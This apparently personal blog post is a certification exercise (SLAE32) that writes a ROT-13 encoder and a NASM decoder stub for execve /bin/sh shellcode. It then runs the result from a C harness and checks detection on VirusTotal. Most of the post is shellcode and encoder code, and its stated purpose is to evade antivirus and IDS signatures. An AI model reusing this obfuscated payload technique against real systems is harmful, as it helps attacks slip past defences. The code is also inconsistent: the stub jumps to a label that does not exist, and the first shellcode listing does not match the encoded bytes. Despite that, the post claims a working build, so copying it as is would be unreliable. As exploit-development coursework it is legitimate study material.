---
layout: page
title: ROT-13 Shellcode encoder - SLAE32 Fourth Exam Assignment
permalink: /encoder/
---

## Introduction
Hello Everyone!
This blog post is dedicated to Assignment 4 of the SLAE32 Exam, which is about creating Custom Shellcode encoder.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/encoder.jpg">
</p>

## Assignment 4 - Custom Shellcode encoder


There are 2 main instructions provided to us in this assignment:
- [ ] Create a custom encoding scheme for your shellcode
- [ ] Create a working PoC with the execve-stack shellcode presented and execute.

## Creating the execve ROT-13 Encoded shellcode

First of all, as presented in our task, we will use the execve-stack shellcode which is presented below.

```c
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Our shellcode is simple stack-based execve SYSCALL that executes /bin/sh

The reason for us to implement encoding scheme on our shellcode is in-order to make it harder for AV’s and IDS to match the new shellcode that we craft by making it obfuscated.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/virus.png">
</p>

### Encoding our shellcode

As for the XOR encoding method, it's already populated throughout the shellcoding world and most AV's and IDS's are well aware of those encoding schemes.

I have decided to choose to encode my shellcode with the ROT-13 technique.

<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/ROT13.png">
</p>


I have created rot13encoder.py in order to craft the encoded shellcode within the ROT-13 technique

the code is presented below:


```python
#!/usr/bin/env python
# Filename: rot13encoder.py
# Author: Gal Nagli
 
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
rot = 13
full = 256 - rot
 
encodedc = ""
encodednasm = []
 
for x in bytearray(shellcode):
    if x < full:
        encodedc += '\\x%02x' % (x + rot)
        encodednasm.append('0x%02x' % (x + rot))
    else:
        encodedc += '\\x%02x' % (rot - 256 + x)
        encodednasm.append('0x%02x' % (rot - 256 + x))
 
print "Encoded Representation for C file:\n%s\n" % encodedc
 
print "Encoded Representation for nasm file:\n%s\n" % ','.join(encodednasm)

```

Next, i will excecute the python script and i will get as output my encoded execve-stack shellcode with easily crafted representation for our decoder.nasm file and shellcode.c file.

```python
python rot13encoder.py
```

![encoder](/images/encoderrot13.png)

### Creating the decoder stub

Now, after crafting the encoded shellcode, i will create my decoder.nasm file. 

Which will decode the shellcode and craft the "decoder stub" which will append right before our shellcode.

```c
# Filename: decoder.nasm
# Author: Gal Nagli
global _start
section .text
_start:
	jmp short call_shellcode
decoder:
	pop esi ; pop the address of the shellcode in the ESI register
	xor ecx, ecx ; zeroing out the ECX register
	mov cl, 25 ; counter = 25 (length of the shellcode, number of loops)
	
decode:
	cmp byte [esi], 0xD ; compare if it's possible to substract the value 13 from the byte
	jl max_reached ; jump if less -> full_reached
	sub byte [esi], 0xD ; substract the value 13
	jmp short shellcode
	
full_reached:
	xor edx, edx ; zeroing out the EDX register
	mov dl, 0xD ; set the value 13 into the EDX register
	sub dl, byte [esi] ; subtract 13 - byte value of the shellcode
	xor ebx, ebx ; zeroing out the EBX register
	mov bl, 0xff ; 0xff = 255 (making it two-staged to not encounter null-byte)
	inc ebx ; = 256
	sub bx, dx ; 256 - (13 - byte value of the shellcode)
	mov byte [esi], bl ; move bl into the ESI register
	
shellcode:
	inc esi ; move to the next byte
	loop decode ; loop "decode"
	jmp short EncodedShellcode
	
call_shellcode:
	call decoder
	EncodedShellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d

```

Now, i will compile the decoder.nasm file and i will recieve our shellcode with the decoderstub beforehand.

```bash
./compile.sh decoder
```

![decoder](/images/decoder.png)


Now, i will insert the crafted shellcode into our shellcode.c program, as the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \

// Decoder Stub:
"\xeb\x24\x5e\x31\xc9\xb1\x19\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff"

// Encoded Shellcode:
"\x3e\xcd\x5d\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\x96\xef\x60\x96\xee\xbd\x18\xda\x8d";


main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}

```

### Creating the executeable

```c
gcc shellcode.c -fno-stack-protector -z execstack -o rot13execve
```

```c
./rot13execve
```


![execve](/images/execverot13.png)

And that's it! we have a running ROT-13 encoded /bin/sh shellcode.

### Uploading our shellcode to virustotal:
Uploading the crafted ROT-13 encoded execve shellcode to VirusTotal returned the following:

![vt](/images/virustotal.png)

Although it was kinda expected because i have used a public known encoding scheme, 17/75 detection ratio is good enough for me at this stage :-)
Thank you very much for sticking around!

## References

* ROT-13 technique - <https://he.wikipedia.org/wiki/ROT13>

## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543

All the source code which i have used throughout the assignment is available here:
<https://github.com/NagliNagli/SLAE/tree/master/ROT13-Execve-Shellcode>

Cheers,
Gal.
